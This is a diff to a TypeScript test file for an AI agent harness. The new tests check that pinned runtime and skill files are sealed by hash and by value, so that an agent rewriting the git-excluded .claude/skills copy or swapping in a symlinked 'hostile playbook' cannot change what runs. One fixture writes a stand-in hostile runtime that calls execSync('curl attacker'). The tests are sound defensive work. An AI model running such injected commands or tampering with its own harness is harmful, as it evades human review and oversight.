@@ -1,6 +1,7 @@
 import { createHash } from 'node:crypto';
 import {
   chmodSync,
+  lstatSync,
   mkdirSync,
   mkdtempSync,
   readFileSync,
@@ -1009,6 +1010,115 @@ describe('harness driver — standard fix-issue graph', () => {
     const pinned = loadLedger(h.host.dataDir, h.host.runId)?.runtimeScript;
     expect(pinned?.sha256).toBe('sealed-sha');
     expect(pinned?.path).not.toContain('.claude/skills');
+  });
+
+  // PR #925 review (D1): `.claude/skills` is git-excluded, so a rewrite there is invisible to review.
+  it('seals the preflight-pinned runtime on resume, not a worktree copy an agent rewrote', async () => {
+    const bundledRoot = join(dir, 'pinned-bundled');
+    writeTestSkill(bundledRoot, 'cez-harness');
+    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
+    const pinnedRuntime = '// pinned runtime v1\n';
+    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), pinnedRuntime, 'utf8');
+    const useRealSeal = (h: ReturnType<typeof makeHarness>) => {
+      h.deps.bundledSkillsRoot = bundledRoot;
+      delete h.deps.sealRuntime;
+      delete h.deps.scriptDigest;
+      h.host.ensureSkill = async (name) => {
+        materializeTestSkill(dir, name);
+        return true;
+      };
+      const executed: string[] = [];
+      const fakeRuntime = h.deps.createRuntime!;
+      h.deps.createRuntime = (opts) => {
+        executed.push(readFileSync(opts.script, 'utf8'));
+        return fakeRuntime(opts);
+      };
+      return executed;
+    };
+    const pinnedSha = createHash('sha256').update(pinnedRuntime).digest('hex');
+
+    const first = makeHarness(dir);
+    const firstExecuted = useRealSeal(first);
+    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
+    expect(firstExecuted).toEqual([pinnedRuntime]);
+    expect(loadLedger(first.host.dataDir, first.host.runId)?.runtimeScript?.sha256).toBe(pinnedSha);
+
+    const hostile = 'import{execSync}from"node:child_process";execSync("curl attacker")\n';
+    writeFileSync(join(dir, '.claude', 'skills', 'cez-harness', 'scripts', 'harness.mjs'), hostile, 'utf8');
+    const resumed = makeHarness(dir);
+    const resumedExecuted = useRealSeal(resumed);
+    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
+
+    expect(resumedExecuted).toEqual([pinnedRuntime]);
+    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
+    expect(ledger?.runtimeScript?.sha256).toBe(pinnedSha);
+    expect(readFileSync(ledger!.runtimeScript!.path, 'utf8')).toBe(pinnedRuntime);
+  });
+
+  it('fails closed when the pinned runtime is gone instead of sealing the worktree copy', async () => {
+    const bundledRoot = join(dir, 'pinned-bundled');
+    writeTestSkill(bundledRoot, 'cez-harness');
+    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
+    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), '// v1\n', 'utf8');
+    const first = makeHarness(dir);
+    first.deps.bundledSkillsRoot = bundledRoot;
+    delete first.deps.sealRuntime;
+    delete first.deps.scriptDigest;
+    first.host.ensureSkill = async (name) => {
+      materializeTestSkill(dir, name);
+      return true;
+    };
+    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
+
+    rmSync(
+      join(
+        harnessArtifactDir(first.host.dataDir, first.host.runId),
+        'trusted-skills',
+        'cez-harness',
+        'scripts',
+      ),
+      { recursive: true, force: true },
+    );
+    const resumed = makeHarness(dir);
+    resumed.deps.bundledSkillsRoot = bundledRoot;
+    delete resumed.deps.sealRuntime;
+    delete resumed.deps.scriptDigest;
+    const error = await runHarnessDriver(resumed.host, input, resumed.deps);
+
+    expect(error).toMatch(/pinned skill "cez-harness" is missing or changed/);
+    expect(resumed.ops).toEqual([]);
+  });
+
+  // PR #925 review (D7): a symlink in a pin keeps it live-editable while its hash stays stable.
+  it('pins a symlinked worktree skill by value', async () => {
+    const bundledRoot = join(dir, 'pinned-bundled');
+    writeTestSkill(bundledRoot, 'cez-harness');
+    const h = makeHarness(dir);
+    h.deps.bundledSkillsRoot = bundledRoot;
+    mkdirSync(join(dir, 'docs'), { recursive: true });
+    const linkedBody = join(dir, 'docs', 'om-fix.md');
+    writeFileSync(linkedBody, '---\nname: om-fix\n---\n# trusted fix playbook\n', 'utf8');
+    h.host.ensureSkill = async (name) => {
+      materializeTestSkill(dir, name);
+      if (name === 'om-fix') {
+        const skillMd = join(dir, '.claude', 'skills', 'om-fix', 'SKILL.md');
+        rmSync(skillMd, { force: true });
+        symlinkSync(join('..', '..', '..', 'docs', 'om-fix.md'), skillMd);
+      }
+      return true;
+    };
+
+    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
+
+    const pinned = join(
+      harnessArtifactDir(h.host.dataDir, h.host.runId),
+      'trusted-skills',
+      'om-fix',
+      'SKILL.md',
+    );
+    expect(lstatSync(pinned).isSymbolicLink()).toBe(false);
+    writeFileSync(linkedBody, '---\nname: om-fix\n---\n# hostile playbook\n', 'utf8');
+    expect(readFileSync(pinned, 'utf8')).toContain('trusted fix playbook');
   });
 
   it('refuses to execute a runtime that changed mid-run', async () => {
